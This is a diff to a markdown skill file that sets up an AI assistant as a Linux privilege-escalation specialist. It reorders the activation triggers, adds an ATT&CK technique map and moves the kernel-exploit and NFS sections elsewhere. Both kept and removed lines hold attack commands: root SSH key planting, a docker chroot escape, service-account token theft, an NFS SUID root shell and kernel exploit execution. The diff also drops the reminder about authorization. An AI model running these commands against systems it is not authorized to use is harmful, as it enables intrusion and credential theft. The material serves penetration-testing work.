@@ -17,6 +17,18 @@ You are a Linux security expert specializing in privilege escalation techniques.
 - Cron job exploitation
 - Path hijacking attacks
 
+## When to Use
+
+Activate this skill when the user asks to:
+- Escalate privileges on a Linux system
+- Enumerate Linux privilege escalation vectors
+- Exploit SUID binaries or capabilities
+- Abuse sudo misconfigurations
+- Escape from containers
+- Identify kernel exploits
+- Find and exploit cron job weaknesses
+- Analyze Linux security misconfigurations
+
 ## When NOT to Use
 
 - **Windows hosts** — use `escalating-windows-privileges`
@@ -336,54 +348,7 @@ ssh-keygen -t rsa
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
 ```
 
-### 7. Kernel Exploits
-
-**Identify Kernel Version:**
-```bash
-uname -a
-cat /proc/version
-uname -r
-```
-
-**Search for Exploits:**
-```bash
-# SearchSploit
-searchsploit "Linux Kernel $(uname -r | cut -d'-' -f1)"
-searchsploit "Linux Kernel 4.4"
-
-# Google search
-# Search: "Linux kernel X.X.X exploit"
-# Search: "Linux kernel X.X.X privilege escalation"
-
-# Automated tools
-linux-exploit-suggester.sh
-linux-exploit-suggester-2.pl
-```
-
-**Common Kernel Exploits:**
-```bash
-# DirtyCow (CVE-2016-5195) - Kernel <= 3.19.0-73.8
-# https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
-
-# CVE-2022-0847 (Dirty Pipe) - Kernel 5.8 - 5.16.11
-# Overwrite read-only files
-
-# CVE-2021-4034 (PwnKit) - PolicyKit
-# Local privilege escalation via pkexec
-
-# CVE-2021-3156 (Baron Samedit) - Sudo < 1.9.5p2
-
-# Compile and run
-gcc -pthread exploit.c -o exploit -lcrypt
-./exploit
-```
-
-**Kernel Exploit Resources:**
-- https://github.com/lucyoa/kernel-exploits
-- https://github.com/SecWiki/linux-kernel-exploits
-- https://github.com/bwbwbwbw/linux-exploit-binaries
-
-### 8. Container Escape
+### 7. Container Escape
 
 **Detect if in Container:**
 ```bash
@@ -422,7 +387,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
 ```
 
-### 9. Password Hunting
+### 8. Password Hunting
 
 **Search for Passwords:**
 ```bash
@@ -459,36 +424,11 @@ find / -name id_dsa 2>/dev/null
 find / -name authorized_keys 2>/dev/null
 ```
 
-### 10. NFS Exploits
+### 9. Kernel Exploits and NFS
 
-**Check NFS Shares:**
-```bash
-# On target
-cat /etc/exports
-showmount -e localhost
-
-# From attacker machine
-showmount -e 10.10.10.10
-
-# Common misconfig: no_root_squash
-# /home *(rw,no_root_squash)
-```
-
-**Exploit no_root_squash:**
-```bash
-# On attacker (as root)
-mkdir /tmp/nfs
-mount -t nfs 10.10.10.10:/home /tmp/nfs
-cd /tmp/nfs
-
-# Create SUID binary
-cp /bin/bash .
-chmod +s bash
-
-# On target
-cd /home
-./bash -p  # root shell
-```
+Last-resort paths, kept out of line because they are rarely the right answer
+and are unstable when they are. See `references/kernel-and-nfs.md` for
+kernel exploit selection and `no_root_squash` NFS abuse.
 
 ## Automated Enumeration Tools
 
@@ -560,16 +500,44 @@ chmod +x pspy64
 - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 - Linux Privilege Escalation Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
 
-## When to Use This Skill
+<!-- attack:start -->
 
-Activate this skill when the user asks to:
-- Escalate privileges on a Linux system
-- Enumerate Linux privilege escalation vectors
-- Exploit SUID binaries or capabilities
-- Abuse sudo misconfigurations
-- Escape from containers
-- Identify kernel exploits
-- Find and exploit cron job weaknesses
-- Analyze Linux security misconfigurations
+## ATT&CK Coverage
 
-Always ensure proper authorization before performing privilege escalation on any system.
+_Generated from `secskills/ttp-index.json` — edit that file, then run
+`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
+current ATT&CK release before citing them in a report._
+
+**Execution** (TA0002)
+
+- [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
+
+**Persistence** (TA0003)
+
+- [T1053.003](https://attack.mitre.org/techniques/T1053/003/) Cron — see also `establishing-persistence`
+- [T1543.002](https://attack.mitre.org/techniques/T1543/002/) Systemd Service — see also `establishing-persistence`
+
+**Privilege Escalation** (TA0004)
+
+- [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation — see also `escalating-windows-privileges`
+- [T1548](https://attack.mitre.org/techniques/T1548/) Abuse Elevation Control Mechanism _(also Defense Evasion)_ — see also `escalating-windows-privileges`
+- [T1548.001](https://attack.mitre.org/techniques/T1548/001/) Setuid and Setgid
+- [T1548.003](https://attack.mitre.org/techniques/T1548/003/) Sudo and Sudo Caching
+
+**Credential Access** (TA0006)
+
+- [T1003.008](https://attack.mitre.org/techniques/T1003/008/) /etc/passwd and /etc/shadow — see also `cracking-passwords`
+- [T1552](https://attack.mitre.org/techniques/T1552/) Unsecured Credentials — see also `exploiting-cloud-platforms`, `auditing-supply-chain`
+
+**Discovery** (TA0007)
+
+- [T1082](https://attack.mitre.org/techniques/T1082/) System Information Discovery — see also `escalating-windows-privileges`
+- [T1083](https://attack.mitre.org/techniques/T1083/) File and Directory Discovery — see also `escalating-windows-privileges`
+
+**Lateral Movement** (TA0008)
+
+- [T1021.004](https://attack.mitre.org/techniques/T1021/004/) SSH — see also `enumerating-network-services`
+
+Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.
+
+<!-- attack:end -->
